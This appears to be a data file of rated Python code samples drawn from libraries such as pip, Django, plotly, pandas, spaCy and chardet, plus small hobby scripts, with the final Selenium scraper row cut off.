378	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCTWDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import EUCTW_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class EUCTWProber(MultiByteCharSetProber):<<NEWL>>    def __init__(self) -> None:<<NEWL>>        super().__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(EUCTW_SM_MODEL)<<NEWL>>        self.distribution_analyzer = EUCTWDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self) -> str:<<NEWL>>        return ""EUC-TW""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self) -> str:<<NEWL>>        return ""Taiwan"""
436	adjudicated	1	"""""""xmlrpclib.Transport implementation<<NEWL>>""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import urllib.parse<<NEWL>>import xmlrpc.client<<NEWL>>from typing import TYPE_CHECKING, Tuple<<NEWL>><<NEWL>>from pip._internal.exceptions import NetworkConnectionError<<NEWL>>from pip._internal.network.session import PipSession<<NEWL>>from pip._internal.network.utils import raise_for_status<<NEWL>><<NEWL>>if TYPE_CHECKING:<<NEWL>>    from xmlrpc.client import _HostType, _Marshallable<<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>class PipXmlrpcTransport(xmlrpc.client.Transport):<<NEWL>>    """"""Provide a `xmlrpclib.Transport` implementation via a `PipSession`<<NEWL>>    object.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self, index_url: str, session: PipSession, use_datetime: bool = False<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(use_datetime)<<NEWL>>        index_parts = urllib.parse.urlparse(index_url)<<NEWL>>        self._scheme = index_parts.scheme<<NEWL>>        self._session = session<<NEWL>><<NEWL>>    def request(<<NEWL>>        self,<<NEWL>>        host: ""_HostType"",<<NEWL>>        handler: str,<<NEWL>>        request_body: bytes,<<NEWL>>        verbose: bool = False,<<NEWL>>    ) -> Tuple[""_Marshallable"", ...]:<<NEWL>>        assert isinstance(host, str)<<NEWL>>        parts = (self._scheme, host, handler, None, None, None)<<NEWL>>        url = urllib.parse.urlunparse(parts)<<NEWL>>        try:<<NEWL>>            headers = {""Content-Type"": ""text/xml""}<<NEWL>>            response = self._session.post(<<NEWL>>                url,<<NEWL>>                data=request_body,<<NEWL>>                headers=headers,<<NEWL>>                stream=True,<<NEWL>>            )<<NEWL>>            raise_for_status(response)<<NEWL>>            self.verbose = verbose<<NEWL>>            return self.parse_response(response.raw)<<NEWL>>        except NetworkConnectionError as exc:<<NEWL>>            assert exc.response<<NEWL>>            logger.critical(<<NEWL>>                ""HTTP error %s while getting %s"",<<NEWL>>                exc.response.status_code,<<NEWL>>                url,<<NEWL>>            )<<NEWL>>            raise"
467	adjudicated	2	"import json<<NEWL>><<NEWL>>from django import forms<<NEWL>>from django.core.exceptions import ValidationError<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>><<NEWL>>__all__ = [""HStoreField""]<<NEWL>><<NEWL>><<NEWL>>class HStoreField(forms.CharField):<<NEWL>>    """"""<<NEWL>>    A field for HStore data which accepts dictionary JSON input.<<NEWL>>    """"""<<NEWL>><<NEWL>>    widget = forms.Textarea<<NEWL>>    default_error_messages = {<<NEWL>>        ""invalid_json"": _(""Could not load JSON data.""),<<NEWL>>        ""invalid_format"": _(""Input must be a JSON dictionary.""),<<NEWL>>    }<<NEWL>><<NEWL>>    def prepare_value(self, value):<<NEWL>>        if isinstance(value, dict):<<NEWL>>            return json.dumps(value)<<NEWL>>        return value<<NEWL>><<NEWL>>    def to_python(self, value):<<NEWL>>        if not value:<<NEWL>>            return {}<<NEWL>>        if not isinstance(value, dict):<<NEWL>>            try:<<NEWL>>                value = json.loads(value)<<NEWL>>            except json.JSONDecodeError:<<NEWL>>                raise ValidationError(<<NEWL>>                    self.error_messages[""invalid_json""],<<NEWL>>                    code=""invalid_json"",<<NEWL>>                )<<NEWL>><<NEWL>>        if not isinstance(value, dict):<<NEWL>>            raise ValidationError(<<NEWL>>                self.error_messages[""invalid_format""],<<NEWL>>                code=""invalid_format"",<<NEWL>>            )<<NEWL>><<NEWL>>        # Cast everything to strings for ease.<<NEWL>>        for key, val in value.items():<<NEWL>>            if val is not None:<<NEWL>>                val = str(val)<<NEWL>>            value[key] = val<<NEWL>>        return value<<NEWL>><<NEWL>>    def has_changed(self, initial, data):<<NEWL>>        """"""<<NEWL>>        Return True if data differs from initial.<<NEWL>>        """"""<<NEWL>>        # For purposes of seeing whether something has changed, None is<<NEWL>>        # the same as an empty dict, if the data or initial value we get<<NEWL>>        # is None, replace it w/ {}.<<NEWL>>        initial_value = self.to_python(initial)<<NEWL>>        return super().has_changed(initial_value, data)"
494	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""insidetextfont"", parent_name=""funnel"", **kwargs):<<NEWL>>        super(InsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
453	adjudicated	0	"from node import HuffmanNode<<NEWL>><<NEWL>><<NEWL>>class Huffman():<<NEWL>><<NEWL>>    def __init__(self, s:str) -> None:<<NEWL>>        self.__weights = self.__get_weights(s)<<NEWL>>        self.__buffer = [b' ' for _ in range(round(len(self.__weights)))]<<NEWL>>        self.__tree = self.__build_huffman_tree(self.__weights)<<NEWL>>        self.__code = self.__build_code(self.__tree)<<NEWL>><<NEWL>>    @property<<NEWL>>    def weights(self):<<NEWL>>        return self.__weights<<NEWL>><<NEWL>>    @property<<NEWL>>    def tree(self):<<NEWL>>        return self.__tree<<NEWL>><<NEWL>>    @property<<NEWL>>    def code(self):<<NEWL>>        return self.__code<<NEWL>><<NEWL>>    def __get_weights(self, s:str) -> dict:<<NEWL>>        weights = dict()<<NEWL>>        for i in s:<<NEWL>>            weights[i] = weights.get(i, 0)+1<<NEWL>>        return weights<<NEWL>>    <<NEWL>>    def __build_huffman_tree(self, weights:dict):<<NEWL>>        nodes = [HuffmanNode(value, weight) for value,weight in weights.items()]<<NEWL>>        while len(nodes) > 1:<<NEWL>>            nodes.sort(key=lambda node:node.weight, reverse=True)<<NEWL>>            c = HuffmanNode(value=None, weight=(nodes[-1].weight+nodes[-2].weight))<<NEWL>>            c.left_node = nodes.pop()<<NEWL>>            c.right_node = nodes.pop()<<NEWL>>            nodes.append(c)<<NEWL>>        return nodes[0]<<NEWL>><<NEWL>>    def __build_code(self, tree):<<NEWL>>        <<NEWL>>        def func(tree:HuffmanNode, length:int):<<NEWL>>            nonlocal code, self<<NEWL>>            node = tree<<NEWL>>            if not node:<<NEWL>>                return<<NEWL>>            elif node.value:<<NEWL>>                code[node.value] = b''.join( self.__buffer[:length] )<<NEWL>>                return<<NEWL>>            self.__buffer[length] = b'0'<<NEWL>>            func(node.left_node, length+1)<<NEWL>>            self.__buffer[length] = b'1'<<NEWL>>            func(node.right_node, length+1)<<NEWL>>        <<NEWL>>        code = dict()<<NEWL>>        func(tree, 0)<<NEWL>>        return code<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    s = ""aabbccdddeefgenajojfonadkjfwqnioaerweggrefdsfassasdfgr""<<NEWL>><<NEWL>>    huffman = Huffman(s)<<NEWL>><<NEWL>>    print(huffman.weights)<<NEWL>>    print(huffman.code)"
513	adjudicated	1	"# coding: utf8<<NEWL>>from __future__ import unicode_literals<<NEWL>><<NEWL>>from ...attrs import LIKE_NUM<<NEWL>><<NEWL>>_num_words = [<<NEWL>>    ""אפס"",<<NEWL>>    ""אחד"",<<NEWL>>    ""אחת"",<<NEWL>>    ""שתיים"",<<NEWL>>    ""שתים"",<<NEWL>>    ""שניים"",<<NEWL>>    ""שנים"",<<NEWL>>    ""שלוש"",<<NEWL>>    ""שלושה"",<<NEWL>>    ""ארבע"",<<NEWL>>    ""ארבעה"",<<NEWL>>    ""חמש"",<<NEWL>>    ""חמישה"",<<NEWL>>    ""שש"",<<NEWL>>    ""שישה"",<<NEWL>>    ""שבע"",<<NEWL>>    ""שבעה"",<<NEWL>>    ""שמונה"",<<NEWL>>    ""תשע"",<<NEWL>>    ""תשעה"",<<NEWL>>    ""עשר"",<<NEWL>>    ""עשרה"",<<NEWL>>    ""אחד עשר"",<<NEWL>>    ""אחת עשרה"",<<NEWL>>    ""שנים עשר"",<<NEWL>>    ""שתים עשרה"",<<NEWL>>    ""שלושה עשר"",<<NEWL>>    ""שלוש עשרה"",<<NEWL>>    ""ארבעה עשר"",<<NEWL>>    ""ארבע עשרה"",<<NEWL>>    ""חמישה עשר"",<<NEWL>>    ""חמש עשרה"",<<NEWL>>    ""ששה עשר"",<<NEWL>>    ""שש עשרה"",<<NEWL>>    ""שבעה עשר"",<<NEWL>>    ""שבע עשרה"",<<NEWL>>    ""שמונה עשר"",<<NEWL>>    ""שמונה עשרה"",<<NEWL>>    ""תשעה עשר"",<<NEWL>>    ""תשע עשרה"",<<NEWL>>    ""עשרים"",<<NEWL>>    ""שלושים"",<<NEWL>>    ""ארבעים"",<<NEWL>>    ""חמישים"",<<NEWL>>    ""שישים"",<<NEWL>>    ""שבעים"",<<NEWL>>    ""שמונים"",<<NEWL>>    ""תשעים"",<<NEWL>>    ""מאה"",<<NEWL>>    ""אלף"",<<NEWL>>    ""מליון"",<<NEWL>>    ""מליארד"",<<NEWL>>    ""טריליון"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>_ordinal_words = [<<NEWL>>    ""ראשון"",<<NEWL>>    ""שני"",<<NEWL>>    ""שלישי"",<<NEWL>>    ""רביעי"",<<NEWL>>    ""חמישי"",<<NEWL>>    ""שישי"",<<NEWL>>    ""שביעי"",<<NEWL>>    ""שמיני"",<<NEWL>>    ""תשיעי"",<<NEWL>>    ""עשירי"",<<NEWL>>]<<NEWL>><<NEWL>>def like_num(text):<<NEWL>>    if text.startswith((""+"", ""-"", ""±"", ""~"")):<<NEWL>>        text = text[1:]<<NEWL>>    text = text.replace("","", """").replace(""."", """")<<NEWL>>    if text.isdigit():<<NEWL>>        return True<<NEWL>><<NEWL>>    if text.count(""/"") == 1:<<NEWL>>        num, denom = text.split(""/"")<<NEWL>>        if num.isdigit() and denom.isdigit():<<NEWL>>            return True<<NEWL>>    <<NEWL>>    if text in _num_words:<<NEWL>>        return True<<NEWL>><<NEWL>>    # CHeck ordinal number<<NEWL>>    if text in _ordinal_words:<<NEWL>>        return True<<NEWL>>    return False<<NEWL>><<NEWL>><<NEWL>>LEX_ATTRS = {LIKE_NUM: like_num}"
402	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = ""l, j F, Y""<<NEWL>>TIME_FORMAT = ""h:i a""<<NEWL>>DATETIME_FORMAT = ""j F, Y h:i a""<<NEWL>>YEAR_MONTH_FORMAT = ""F, Y""<<NEWL>>MONTH_DAY_FORMAT = ""j F""<<NEWL>>SHORT_DATE_FORMAT = ""j.M.Y""<<NEWL>>SHORT_DATETIME_FORMAT = ""j.M.Y H:i""<<NEWL>>FIRST_DAY_OF_WEEK = 1  # (Monday)<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    ""%Y-%m-%d"",  # '2006-10-25'<<NEWL>>    ""%m/%d/%Y"",  # '10/25/2006'<<NEWL>>    ""%m/%d/%y"",  # '10/25/06'<<NEWL>>    ""%d.%m.%Y"",  # '25.10.2006'<<NEWL>>    ""%d.%m.%y"",  # '25.10.06'<<NEWL>>    # ""%d %b %Y"",  # '25 Oct 2006'<<NEWL>>    # ""%d %b, %Y"",  # '25 Oct, 2006'<<NEWL>>    # ""%d %b. %Y"",  # '25 Oct. 2006'<<NEWL>>    # ""%d %B %Y"",  # '25 October 2006'<<NEWL>>    # ""%d %B, %Y"",  # '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'<<NEWL>>    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'<<NEWL>>    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'<<NEWL>>    ""%d.%m.%Y %H:%M:%S"",  # '25.10.2006 14:30:59'<<NEWL>>    ""%d.%m.%Y %H:%M:%S.%f"",  # '25.10.2006 14:30:59.000200'<<NEWL>>    ""%d.%m.%Y %H:%M"",  # '25.10.2006 14:30'<<NEWL>>    ""%d.%m.%y %H:%M:%S"",  # '25.10.06 14:30:59'<<NEWL>>    ""%d.%m.%y %H:%M:%S.%f"",  # '25.10.06 14:30:59.000200'<<NEWL>>    ""%d.%m.%y %H:%M"",  # '25.10.06 14:30'<<NEWL>>    ""%m/%d/%Y %H:%M:%S"",  # '10/25/2006 14:30:59'<<NEWL>>    ""%m/%d/%Y %H:%M:%S.%f"",  # '10/25/2006 14:30:59.000200'<<NEWL>>    ""%m/%d/%Y %H:%M"",  # '10/25/2006 14:30'<<NEWL>>    ""%m/%d/%y %H:%M:%S"",  # '10/25/06 14:30:59'<<NEWL>>    ""%m/%d/%y %H:%M:%S.%f"",  # '10/25/06 14:30:59.000200'<<NEWL>>    ""%m/%d/%y %H:%M"",  # '10/25/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = "".""<<NEWL>>THOUSAND_SEPARATOR = "" ""<<NEWL>>NUMBER_GROUPING = 3"
480	adjudicated	1	"""""""<<NEWL>>Customized Mixin2to3 support:<<NEWL>><<NEWL>> - adds support for converting doctests<<NEWL>><<NEWL>><<NEWL>>This module raises an ImportError on Python 2.<<NEWL>>""""""<<NEWL>><<NEWL>>from distutils.util import Mixin2to3 as _Mixin2to3<<NEWL>>from distutils import log<<NEWL>>from lib2to3.refactor import RefactoringTool, get_fixers_from_package<<NEWL>><<NEWL>>import setuptools<<NEWL>><<NEWL>><<NEWL>>class DistutilsRefactoringTool(RefactoringTool):<<NEWL>>    def log_error(self, msg, *args, **kw):<<NEWL>>        log.error(msg, *args)<<NEWL>><<NEWL>>    def log_message(self, msg, *args):<<NEWL>>        log.info(msg, *args)<<NEWL>><<NEWL>>    def log_debug(self, msg, *args):<<NEWL>>        log.debug(msg, *args)<<NEWL>><<NEWL>><<NEWL>>class Mixin2to3(_Mixin2to3):<<NEWL>>    def run_2to3(self, files, doctests=False):<<NEWL>>        # See of the distribution option has been set, otherwise check the<<NEWL>>        # setuptools default.<<NEWL>>        if self.distribution.use_2to3 is not True:<<NEWL>>            return<<NEWL>>        if not files:<<NEWL>>            return<<NEWL>>        log.info(""Fixing "" + "" "".join(files))<<NEWL>>        self.__build_fixer_names()<<NEWL>>        self.__exclude_fixers()<<NEWL>>        if doctests:<<NEWL>>            if setuptools.run_2to3_on_doctests:<<NEWL>>                r = DistutilsRefactoringTool(self.fixer_names)<<NEWL>>                r.refactor(files, write=True, doctests_only=True)<<NEWL>>        else:<<NEWL>>            _Mixin2to3.run_2to3(self, files)<<NEWL>><<NEWL>>    def __build_fixer_names(self):<<NEWL>>        if self.fixer_names:<<NEWL>>            return<<NEWL>>        self.fixer_names = []<<NEWL>>        for p in setuptools.lib2to3_fixer_packages:<<NEWL>>            self.fixer_names.extend(get_fixers_from_package(p))<<NEWL>>        if self.distribution.use_2to3_fixers is not None:<<NEWL>>            for p in self.distribution.use_2to3_fixers:<<NEWL>>                self.fixer_names.extend(get_fixers_from_package(p))<<NEWL>><<NEWL>>    def __exclude_fixers(self):<<NEWL>>        excluded_fixers = getattr(self, 'exclude_fixers', [])<<NEWL>>        if self.distribution.use_2to3_exclude_fixers is not None:<<NEWL>>            excluded_fixers.extend(self.distribution.use_2to3_exclude_fixers)<<NEWL>>        for fixer_name in excluded_fixers:<<NEWL>>            if fixer_name in self.fixer_names:<<NEWL>>                self.fixer_names.remove(fixer_name)"
422	adjudicated	3	"import importlib.metadata<<NEWL>>from typing import Any, Optional, Protocol, cast<<NEWL>><<NEWL>><<NEWL>>class BadMetadata(ValueError):<<NEWL>>    def __init__(self, dist: importlib.metadata.Distribution, *, reason: str) -> None:<<NEWL>>        self.dist = dist<<NEWL>>        self.reason = reason<<NEWL>><<NEWL>>    def __str__(self) -> str:<<NEWL>>        return f""Bad metadata in {self.dist} ({self.reason})""<<NEWL>><<NEWL>><<NEWL>>class BasePath(Protocol):<<NEWL>>    """"""A protocol that various path objects conform.<<NEWL>><<NEWL>>    This exists because importlib.metadata uses both ``pathlib.Path`` and<<NEWL>>    ``zipfile.Path``, and we need a common base for type hints (Union does not<<NEWL>>    work well since ``zipfile.Path`` is too new for our linter setup).<<NEWL>><<NEWL>>    This does not mean to be exhaustive, but only contains things that present<<NEWL>>    in both classes *that we need*.<<NEWL>>    """"""<<NEWL>><<NEWL>>    @property<<NEWL>>    def name(self) -> str:<<NEWL>>        raise NotImplementedError()<<NEWL>><<NEWL>>    @property<<NEWL>>    def parent(self) -> ""BasePath"":<<NEWL>>        raise NotImplementedError()<<NEWL>><<NEWL>><<NEWL>>def get_info_location(d: importlib.metadata.Distribution) -> Optional[BasePath]:<<NEWL>>    """"""Find the path to the distribution's metadata directory.<<NEWL>><<NEWL>>    HACK: This relies on importlib.metadata's private ``_path`` attribute. Not<<NEWL>>    all distributions exist on disk, so importlib.metadata is correct to not<<NEWL>>    expose the attribute as public. But pip's code base is old and not as clean,<<NEWL>>    so we do this to avoid having to rewrite too many things. Hopefully we can<<NEWL>>    eliminate this some day.<<NEWL>>    """"""<<NEWL>>    return getattr(d, ""_path"", None)<<NEWL>><<NEWL>><<NEWL>>def get_dist_name(dist: importlib.metadata.Distribution) -> str:<<NEWL>>    """"""Get the distribution's project name.<<NEWL>><<NEWL>>    The ``name`` attribute is only available in Python 3.10 or later. We are<<NEWL>>    targeting exactly that, but Mypy does not know this.<<NEWL>>    """"""<<NEWL>>    name = cast(Any, dist).name<<NEWL>>    if not isinstance(name, str):<<NEWL>>        raise BadMetadata(dist, reason=""invalid metadata entry 'name'"")<<NEWL>>    return name"
447	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class LineValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""line"", parent_name=""scatterpolar"", **kwargs):<<NEWL>>        super(LineValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Line""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            backoff<<NEWL>>                Sets the line back off from the end point of<<NEWL>>                the nth line segment (in px). This option is<<NEWL>>                useful e.g. to avoid overlap with arrowhead<<NEWL>>                markers. With ""auto"" the lines would trim<<NEWL>>                before markers if `marker.angleref` is set to<<NEWL>>                ""previous"".<<NEWL>>            backoffsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `backoff`.<<NEWL>>            color<<NEWL>>                Sets the line color.<<NEWL>>            dash<<NEWL>>                Sets the dash style of lines. Set to a dash<<NEWL>>                type string (""solid"", ""dot"", ""dash"",<<NEWL>>                ""longdash"", ""dashdot"", or ""longdashdot"") or a<<NEWL>>                dash length list in px (eg ""5px,10px,2px,2px"").<<NEWL>>            shape<<NEWL>>                Determines the line shape. With ""spline"" the<<NEWL>>                lines are drawn using spline interpolation. The<<NEWL>>                other available values correspond to step-wise<<NEWL>>                line shapes.<<NEWL>>            smoothing<<NEWL>>                Has an effect only if `shape` is set to<<NEWL>>                ""spline"" Sets the amount of smoothing. 0<<NEWL>>                corresponds to no smoothing (equivalent to a<<NEWL>>                ""linear"" shape).<<NEWL>>            width<<NEWL>>                Sets the line width (in px).<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
416	adjudicated	0	"import pytest<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    DatetimeIndex,<<NEWL>>    date_range,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>def astype_non_nano(dti_nano, unit):<<NEWL>>    # TODO(2.0): remove once DTI/DTA.astype supports non-nano<<NEWL>>    if unit == ""ns"":<<NEWL>>        return dti_nano<<NEWL>><<NEWL>>    dta_nano = dti_nano._data<<NEWL>>    arr_nano = dta_nano._ndarray<<NEWL>><<NEWL>>    arr = arr_nano.astype(f""M8[{unit}]"")<<NEWL>>    if dti_nano.tz is None:<<NEWL>>        dtype = arr.dtype<<NEWL>>    else:<<NEWL>>        dtype = type(dti_nano.dtype)(tz=dti_nano.tz, unit=unit)<<NEWL>>    dta = type(dta_nano)._simple_new(arr, dtype=dtype)<<NEWL>>    dti = DatetimeIndex(dta, name=dti_nano.name)<<NEWL>>    assert dti.dtype == dtype<<NEWL>>    return dti<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.filterwarnings(""ignore::DeprecationWarning"")<<NEWL>>@pytest.mark.parametrize(""tz"", [None, ""Asia/Shanghai"", ""Europe/Berlin""])<<NEWL>>@pytest.mark.parametrize(""name"", [None, ""my_dti""])<<NEWL>>@pytest.mark.parametrize(""unit"", [""ns"", ""us"", ""ms"", ""s""])<<NEWL>>def test_dti_snap(name, tz, unit):<<NEWL>>    dti = DatetimeIndex(<<NEWL>>        [<<NEWL>>            ""1/1/2002"",<<NEWL>>            ""1/2/2002"",<<NEWL>>            ""1/3/2002"",<<NEWL>>            ""1/4/2002"",<<NEWL>>            ""1/5/2002"",<<NEWL>>            ""1/6/2002"",<<NEWL>>            ""1/7/2002"",<<NEWL>>        ],<<NEWL>>        name=name,<<NEWL>>        tz=tz,<<NEWL>>        freq=""D"",<<NEWL>>    )<<NEWL>>    dti = astype_non_nano(dti, unit)<<NEWL>><<NEWL>>    result = dti.snap(freq=""W-MON"")<<NEWL>>    expected = date_range(""12/31/2001"", ""1/7/2002"", name=name, tz=tz, freq=""w-mon"")<<NEWL>>    expected = expected.repeat([3, 4])<<NEWL>>    expected = astype_non_nano(expected, unit)<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>>    assert result.tz == expected.tz<<NEWL>>    assert result.freq is None<<NEWL>>    assert expected.freq is None<<NEWL>><<NEWL>>    result = dti.snap(freq=""B"")<<NEWL>><<NEWL>>    expected = date_range(""1/1/2002"", ""1/7/2002"", name=name, tz=tz, freq=""b"")<<NEWL>>    expected = expected.repeat([1, 1, 1, 2, 2])<<NEWL>>    expected = astype_non_nano(expected, unit)<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>>    assert result.tz == expected.tz<<NEWL>>    assert result.freq is None<<NEWL>>    assert expected.freq is None"
218	adjudicated	0	from django.db import models<<NEWL>><<NEWL>># Create your models here.<<NEWL>>class RTOadmin(models.Model):<<NEWL>>    admin_id=models.AutoField(primary_key = True)<<NEWL>>    admin_username=models.CharField(max_length=50)<<NEWL>>    # authentication/forms.py<<NEWL>>    admin_password = models.CharField(max_length=50)<<NEWL>>    # desc=models.CharField(max_length=300)<<NEWL>>    admin_created_date=models.DateField(auto_now_add=True)<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return self.admin_username<<NEWL>>    <<NEWL>>class Vehicle(models.Model): <<NEWL>>    vehicle_id=models.AutoField(primary_key = True)<<NEWL>>    vehicle_no=models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_own_name = models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_own_contact=models.IntegerField(default=None)<<NEWL>>    vehicle_own_add=models.CharField(max_length=100,default=None)<<NEWL>>    vehicle_own_email=models.CharField(max_length=50, default=None)<<NEWL>>    vehicle_company_name=models.CharField(max_length=50,default=None)<<NEWL>>    # vehicle_class=models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_date_reg=models.DateField(default=None)<<NEWL>>    vehicle_chassics_no=models.CharField(max_length=30,default=None)<<NEWL>>    vehicle_eng_no=models.CharField(max_length=30,default=None)<<NEWL>>    vehicle_own_srno=models.IntegerField(default=None)<<NEWL>>    vehicle_fuel_use=models.CharField(max_length=30,default=None)<<NEWL>>    vehicle_Seat_cap=models.IntegerField(default=None)<<NEWL>>    vehicle_model_name=models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_created_date=models.DateField(auto_now_add=True)  <<NEWL>>    vehicle_last_login=models.CharField(max_length=30,default=None)<<NEWL>><<NEWL>>    def __str__(self):  <<NEWL>>        return self.vehicle_no<<NEWL>><<NEWL>>class Rules(models.Model):<<NEWL>>    rule_id=models.AutoField(primary_key= True)<<NEWL>>    rule_code=models.CharField(max_length=50)<<NEWL>>    rule_desc=models.CharField(max_length=100,blank=True)<<NEWL>>    rule_sect = models.CharField(max_length=50,null=True)<<NEWL>>    rule_pen=models.CharField(max_length=100,null=True)<<NEWL>>    # rule_date=models.DateField(default=None)<<NEWL>>    def __str__(self):  <<NEWL>>        return self.rule_code
189	adjudicated	3	"from selenium import webdriver<<NEWL>>from selenium.webdriver.chrome.service import Service<<NEWL>>from selenium.webdriver.common.by import By<<NEWL>>from selenium.webdriver.common.keys import Keys<<NEWL>>from selenium.webdriver.chrome.options import Options<<NEWL>>from selenium.webdriver.support.ui import WebDriverWait<<NEWL>>from selenium.webdriver.support import expected_conditions as EC<<NEWL>>import csv<<NEWL>>import time<<NEWL>><<NEWL>>url = ""https://u.gg/lol/tier-list""<<NEWL>><<NEWL>>options = Options()<<NEWL>>options.add_argument(""--headless"") # Run Chrome in headless mode<<NEWL>>service = Service(""chromedriver.exe"") # Path to your Chromedriver executable<<NEWL>>driver = webdriver.Chrome(service=service, options=options)<<NEWL>><<NEWL>>driver.get(url)<<NEWL>><<NEWL>>file = open(""Tierlist.csv"", 'w')<<NEWL>>writer = csv.writer(file)<<NEWL>><<NEWL>>wait = WebDriverWait(driver, 10)<<NEWL>>wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, ""div.rt-tr-group"")))<<NEWL>><<NEWL>>champions = []<<NEWL>>win_rates = []<<NEWL>>pick_rates = []<<NEWL>><<NEWL>>writer.writerow(['Champion Name', 'Win rate', 'Pick Rate'])<<NEWL>><<NEWL>>while True:<<NEWL>>    # Scroll to the bottom of the page<<NEWL>>    driver.execute_script(""window.scrollTo(0, document.body.scrollHeight);"")<<NEWL>>    time.sleep(1)<<NEWL>>    <<NEWL>>    # Scroll back to the top of the page<<NEWL>>    driver.execute_script(""window.scrollTo(0, 0);"")<<NEWL>>    time.sleep(1)<<NEWL>>    <<NEWL>>    # Check if all rows have been 